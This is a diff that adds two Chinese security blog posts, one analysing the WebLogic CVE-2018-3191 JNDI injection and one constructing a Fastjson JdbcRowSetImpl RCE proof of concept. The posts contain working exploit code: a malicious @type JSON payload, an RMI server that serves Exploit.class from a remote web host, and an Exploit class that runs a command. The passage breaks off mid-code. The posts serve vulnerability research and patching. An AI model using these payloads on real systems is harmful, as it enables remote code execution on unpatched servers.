@@ -334,6 +334,543 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/Weblogic CVE-2018-3191分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="url">
+                  Weblogic CVE-2018-3191分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T14:54:40+08:00">
+                2018-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/23/Weblogic CVE-2018-3191分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/10/23/Weblogic CVE-2018-3191分析/" class="leancloud_visitors" data-flag-title="Weblogic CVE-2018-3191分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>已经在公众号发表，链接地址：<a href="https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg" target="_blank" rel="external">https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg</a></p>
+<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h2><p>北京时间10月17日，Oracle官方发布的10月关键补丁更新CPU（Critical Patch Update）中修复了一个高危的WebLogic远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。这个漏洞由Matthias Kaiser，loopx9，Li Zhengdong申报。<br><img src="/images/2018-3191-1.png" alt="1"></p>
+<h2 id="2-补丁分析"><a href="#2-补丁分析" class="headerlink" title="2 补丁分析"></a>2 补丁分析</h2><p>如下图所示<br><img src="/images/2018-3191-2.png" alt="2"><br>这回的补丁主要增加了两个大类黑名单，分别是java.rmi.server.RemoteObject和com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager，RemoteObject是用于修补漏洞编号为CVE-2018-3245的漏洞，当时笔者在报这个漏洞的过程中就将所有涉及到RemoteObject相关的poc都提交给了Oracle官方。AbstractPlatformTransactionManager这个黑名单就是用于防止Spring JNDI注入，从官方以前的黑名单上就能看到org.springframework.transaction.support.AbstractPlatformTransactionManager,但是官方没有想到在com.bea.core.repackaged的相关包还有spring的相关类。其实这两个包中的类实现几乎一样，只是来源于不同的包。</p>
+<h2 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3 动态分析"></a>3 动态分析</h2><p>通过前一章的静态分析已经知道CVE-2018-3191所对应的补丁，就是AbstractPlatformTransactionManager，用于防止Spring JNDI注入。在我们的PoC中主要用到JtaTransactionManager这个类。下面来看一下这个类中关键的几个地方。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JtaTransactionManager</span> <span class="keyword">extends</span> <span class="title">AbstractPlatformTransactionManager</span> <span class="keyword">implements</span> <span class="title">TransactionFactory</span>, <span class="title">InitializingBean</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_USER_TRANSACTION_NAME = <span class="string">"java:comp/UserTransaction"</span>;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] FALLBACK_TRANSACTION_MANAGER_NAMES = <span class="keyword">new</span> String[]&#123;<span class="string">"java:comp/TransactionManager"</span>, <span class="string">"java:appserver/TransactionManager"</span>, <span class="string">"java:pm/TransactionManager"</span>, <span class="string">"java:/TransactionManager"</span>&#125;;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_TRANSACTION_SYNCHRONIZATION_REGISTRY_NAME = <span class="string">"java:comp/TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRANSACTION_SYNCHRONIZATION_REGISTRY_CLASS_NAME = <span class="string">"javax.transaction.TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> JndiTemplate jndiTemplate;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> UserTransaction userTransaction;</div><div class="line">   <span class="keyword">private</span> String userTransactionName;</div><div class="line">    .....</div></pre></td></tr></table></figure></p>
+<p>JtaTransactionManager类继承自AbstractPlatformTransactionManager，实现了Serializable接口，其中私有属性userTransactionName是用于JNDI寻址。<br>在Java反序列化中，入口有很多，readObject是最常见的，定位到JtaTransactionManager.readObject方法，实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">   ois.defaultReadObject();</div><div class="line">   <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</div><div class="line">   <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</div><div class="line">   <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>继续跟踪initUserTransactionAndTransactionManager方法的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</div><div class="line">         <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">.....</div></pre></td></tr></table></figure></p>
+<p>在 initUserTransactionAndTransactionManager的方法中就有基于JNDI寻址方法lookupUserTransaction<br>关键寻址部分代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</div><div class="line">         <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</div><div class="line">   &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>有了如上的分析，构造PoC也是水到渠成，下面是PoC的关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getJtaTransactionManagerObject</span><span class="params">(String command)</span></span>&#123;</div><div class="line"><span class="keyword">int</span> seq = command.indexOf(<span class="string">':'</span>);</div><div class="line"><span class="keyword">if</span> (seq &lt; <span class="number">0</span>)&#123;</div><div class="line">command = <span class="string">"rmi://localhost:1099/Exploit"</span>;</div><div class="line">&#125;</div><div class="line">JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</div><div class="line">jtaTransactionManager.setUserTransactionName(command);</div><div class="line"><span class="keyword">return</span> jtaTransactionManager;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>更详细的关于JNDI的使用可参考作者以前的博文，这里不再重复。漏洞效果如下图：<br><img src="/images/2018-3191-1.png" alt="3"></p>
+<p>由于这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大，请尽快升级到Weblogic最新版。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/15/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/10/15/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="url">
+                  基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-15T15:11:33+08:00">
+                2018-10-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/15/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/10/15/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/10/15/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/" class="leancloud_visitors" data-flag-title="基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这篇文章主要是基于我在看雪2017开发者峰会的演讲而来，由于时间和听众对象的关系，在大会上主要精力都集中在反序列化的防御上。前面的Fastjson PoC的构造分析涉及得很少，另外我在5月份分享的Fastjson Poc构造与分析限制条件太多，所以写下这篇文章。</p>
+<h2 id="Fastjson-使用"><a href="#Fastjson-使用" class="headerlink" title="Fastjson 使用"></a>Fastjson 使用</h2><p>Fastjson是Alibaba开发的，Java语言编写的高性能JSON库。采用“假定有序快速匹配”的算法，号称Java语言中最快的JSON库。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端<br>提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化。项目地址：<code>https://github.com/alibaba/fastjson</code>。那我们看下如何使用？首先定义一个User.java,代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> Long   id;</div><div class="line">    <span class="keyword">private</span> String name;</div><div class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.id = id;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> name;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>序列化的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line">User guestUser = <span class="keyword">new</span> User();</div><div class="line">guestUser.setId(<span class="number">2L</span>);</div><div class="line">guestUser.setName(<span class="string">"guest"</span>);</div><div class="line">String jsonString = JSON.toJSONString(guestUser);</div><div class="line">System.out.println(jsonString);</div></pre></td></tr></table></figure></p>
+<p>反序列化的代码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String jsonString = <span class="string">"&#123;\"name\":\"guest\",\"id\":12&#125;"</span>;</div><div class="line">User user = JSON.parseObject(jsonString, User.class);</div></pre></td></tr></table></figure></p>
+<p>上述代码的parseObject也可以直接用parse接口。</p>
+<h2 id="Fastjson安全特性"><a href="#Fastjson安全特性" class="headerlink" title="Fastjson安全特性"></a>Fastjson安全特性</h2><p>反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法。<br><img src="/images/JdbcRowSetImpl_1.png" alt="1"><br>上图则是Fastjson反序列框架图。JSON门面类，提供一些静态方法，如parse，parseObject.其主要功能都是在DefaultJSONParser类中实现。DefaultJSONParser引用了ParserConfig，主要保存一些相关配置信息。也引用了JSONLexerBase，这个类用来处理字符分析。而反序列化用到的JavaBeanDeserializer则是JavaBean反序列化处理主类。fastjson在1.2.24版本添加enable_autotype开关，将一些类加到黑名单中，后续我也给它报过bypass，fastjson也一并修复。</p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，但是对于json这一块没有涉及。JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。我们可以看一下它的架构图<br><img src="/images/JdbcRowSetImpl_2.png" alt="2">，JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。如果说其lookup方法的参数是我们可以控制的，可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务等等。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line"><span class="comment">//http://xxlegend.com/Exploit.class</span></div><div class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(“Exploit<span class="string">",“Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</div><div class="line">registry.bind(“Exploit<span class="string">", referenceWrapper);</span></div></pre></td></tr></table></figure></p>
+<p>这段代码主要讲到了在1099端口上创建一个RMI服务，RMI的内容则是通过外部的http服务地址获取。在客户端则是将lookup的地址指向刚才我们创建的RMI服务，即能达到远程代码执行的目的。可以使用如下的请求端代码进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hashtable env = new Hashtable();</div><div class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</div><div class="line">env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</div><div class="line">Context ctx = new InitialContext(env);</div><div class="line">Object local_obj = RicterCctx.lookup(&quot;rmi://xxlegend.com/Exploit&quot;);</div></pre></td></tr></table></figure></p>
+<p>那么攻击者的流程就是这样的。攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+<h1 id="PoC构造与分析"><a href="#PoC构造与分析" class="headerlink" title="PoC构造与分析"></a>PoC构造与分析</h1><p>介绍的背景有点多，正式切入我们的正题，基于JdbcRowSetImpl的PoC是如何构造和执行的。在今年5月份的时候，我也公布了Fastjson基于TemplateImpl的PoC的，但是限制还比较多，需要打开SupportNonPublic开关，这个场景是比较少见的，详细的分析见我的博客<code>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</code>，后续ricterz也作了一篇分析：<code>https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</code>。<br>在看雪峰会上我提到了好几种PoC，下面我简单的给这些PoC做个分类：<br>1，基于TemplateImpl<br>2，基于JNDI Bean Property类型<br>3，基于JNDI Field类型</p>
+<p>今天主讲基于JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下，其他的PoC后续再讲。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:389/obj"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</div></pre></td></tr></table></figure></p>
+<p>由于这个PoC是基于JNDI，下面我们简单构造一下，首先是服务端的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span></span></div><div class="line">            AlreadyBoundException, RemoteException, NamingException &#123;</div><div class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</div><div class="line">        <span class="comment">//http://xxlegend.com/Exploit.class即可</span></div><div class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</div><div class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://xxlegend.com/"</span>);</div><div class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</div><div class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</div><div class="line">        start();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>rmi服务端需要一个Exploit.class放到rmi指向的web服务器目录下，这个Exploit.class是一个factory，通过Exploit.java编译得来，在JNDI执行的过程会被初始化。如下是Exploit.java的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        Exploit e = <span class="keyword">new</span> Exploit();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>服务端构造好之后，下面来看java应用执行的代码，示例如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</div><div class="line">        testJdbcRowSetImpl();</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testJdbcRowSetImpl</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">//        String payload = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +</span></div><div class="line"><span class="comment">//                " \"autoCommit\":true&#125;";</span></div><div class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\","</span> +</div><div class="line">                <span class="string">" \"autoCommit\":true&#125;"</span>;</div><div class="line">        JSON.parse(payload);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>完整的代码已经放到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">PoC调用栈如下</div><div class="line"></div><div class="line">![3](/images/JdbcRowSetImpl_3.png)</div><div class="line"></div><div class="line">从这个调用栈就可以看出，在进入Gadget之前，首先是Java应用调用Fastjson的parseObject或者parse接口，进入JavaObjectDeserializer.deserialize方法，经过一系列判断之后发现是JavaBean，就会调用JavaBeanDeserializer.deserialize接口,反序列化得到Gadget相关域，在这个过程中都是通过反射调用这些域的getter，setter或者is方法，这就正式在Gadget执行代码。下面看一下在Gadget中执行的代码。在反序列化过程中是有次序来调用相应接口的，首先是设置dataSourceName属性，这个是其父类BaseRowSet继承过来的。</div><div class="line">```java</div><div class="line">public void setDataSourceName(String name) throws SQLException &#123;</div><div class="line"></div><div class="line">    if (name == null) &#123;</div><div class="line">        dataSource = null;</div><div class="line">    &#125; else if (name.equals(&quot;&quot;)) &#123;</div><div class="line">       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);</div><div class="line">    &#125; else &#123;</div><div class="line">       dataSource = name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    URL = null;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>设置autoCommit属性:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</div><div class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</div><div 